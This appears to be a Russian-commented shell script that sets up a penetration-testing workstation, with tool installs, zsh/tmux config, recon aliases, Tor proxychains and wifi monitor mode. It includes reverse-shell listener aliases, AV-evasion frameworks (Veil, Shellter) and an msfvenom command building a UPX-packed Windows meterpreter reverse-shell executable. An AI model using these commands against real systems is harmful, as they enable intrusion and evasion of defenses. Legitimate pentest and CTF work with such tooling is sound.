# jail-break

sudo apt update && sudo apt full-upgrade -y
sudo apt autoremove --purge -y

sudo apt install -y linux-headers-$(uname -r)
# Если хочешь реальную мощь — поставь liquorix ядро (ниже пинг, выше производительность)
echo 'deb http://liquorix.net/debian bookworm main' | sudo tee /etc/apt/sources.list.d/liquorix.list
wget -O- 'https://liquorix.net/keys/liquorix-keyring.gpg' | sudo apt-key add -
sudo apt update && sudo apt install -y linux-image-liquorix-amd64 linux-headers-liquorix-amd64

sudo apt install -y zsh fzf bat exa ripgrep
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k
sed -i 's/ZSH_THEME="robbyrussell"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' ~/.zshrc

git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
git clone https://github.com/zdharma-continuum/fast-syntax-highlighting ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/fast-syntax-highlighting
# Добавь в .zshrc:
sed -i 's/plugins=(git)/plugins=(git zsh-autosuggestions zsh-syntax-highlighting fast-syntax-highlighting docker docker-compose kali tmux)/' ~/.zshrc

sudo apt install -y tmux
cat > ~/.tmux.conf << 'EOF'
set -g mouse on
set -g history-limit 50000
set -g default-terminal "screen-256color"
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R
bind r source-file ~/.tmux.conf
set -g status-bg black
set -g status-fg white
set -g status-left "#[fg=green]#S #[fg=white]|"
set -g status-right "#[fg=yellow]%H:%M #[fg=cyan]%d-%b-%y"
EOF

sudo apt install -y \
  nmap \
  wireshark \
  metasploit-framework \
  burpsuite \
  sqlmap \
  hydra \
  john \
  hashcat \
  aircrack-ng \
  gobuster \
  dirb \
  ffuf \
  nikto \
  wpscan \
  enum4linux \
  smbclient \
  impacket-scripts \
  bloodhound \
  evil-winrm \
  seclists \
  wordlists \
  exploitdb


  
  # GF (patterns for grep)
go install -v github.com/tomnomnom/gf@latest
cp -r ~/go/pkg/mod/github.com/tomnomnom/gf@*/examples ~/.gf

# httpx, nuclei, subfinder (ProjectDiscovery)
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# amass
go install -v github.com/OWASP/Amass/v3/...@master

# waybackurls
go install github.com/tomnomnom/waybackurls@latest

# qsreplace
go install github.com/tomnomnom/qsreplace@latest

# naabu (port scanner)
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# anew (append to file)
go install github.com/tomnomnom/anew@latest

# dalfox (XSS scanner)
go install github.com/hahwul/dalfox/v2@latest

# katana (crawler)
go install github.com/projectdiscovery/katana/cmd/katana@latest


echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc
source ~/.zshrc

mkdir -p ~/pentest/{recon,exploit,privesc,reports,wordlists,tools,notes}
mkdir -p ~/ctf/{web,rev,pwn,crypto,forensics}
mkdir -p ~/tools/{recon,scanners,exploits,priv,osint}


cat >> ~/.zshrc << 'EOF'
# Recon
alias nmap-fast="sudo nmap -sS -sV -T4 -F"
alias nmap-full="sudo nmap -sS -sC -sV -O -p- -T4"
alias nmap-udp="sudo nmap -sU -sV -T4 -F"

# Web
alias ffuf-recursive="ffuf -recursion -recursion-depth 3 -c -v"
alias dirsearch="python3 /usr/share/dirsearch/dirsearch.py"

# Listeners
alias listen-http="sudo python3 -m http.server 80"
alias listen-https="sudo python3 -m http.server 443"
alias listen-nc="sudo nc -lvnp"
alias rshell="sudo rlwrap nc -lvnp"

# Windows
alias smb-server="sudo impacket-smbserver share . -smb2support"
alias winrm="evil-winrm -i"

# Utils
alias update-all="sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y"
alias extract="7z x"
alias ip="curl -s ifconfig.me"
alias ports="sudo netstat -tulpn"
alias webserver="php -S 0.0.0.0:8000"
EOF

sudo sed -i 's/#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
sudo sed -i 's/strict_chain/#strict_chain/' /etc/proxychains4.conf
echo "socks4 127.0.0.1 9050" | sudo tee -a /etc/proxychains4.conf
sudo systemctl enable tor --now


cd /opt
sudo git clone https://github.com/Veil-Framework/Veil.git
cd Veil
sudo ./Install.sh -c

sudo apt install -y shellter

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe -o payload.exe
# а потом вешай UPX для сжатия
upx --best payload.exe

# Проверка, что карта поддерживает монитор-режим
iwconfig
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Основной набор
sudo apt install -y bettercap hcxdumptool hcxtools

sudo msfdb init
# Добавь в .zshrc:
alias msfconsole='sudo msfconsole -q'

sudo apt install -y theharvester recon-ng maltego photon
git clone https://github.com/laramies/theHarvester.git
git clone https://github.com/sherlock-project/sherlock.git
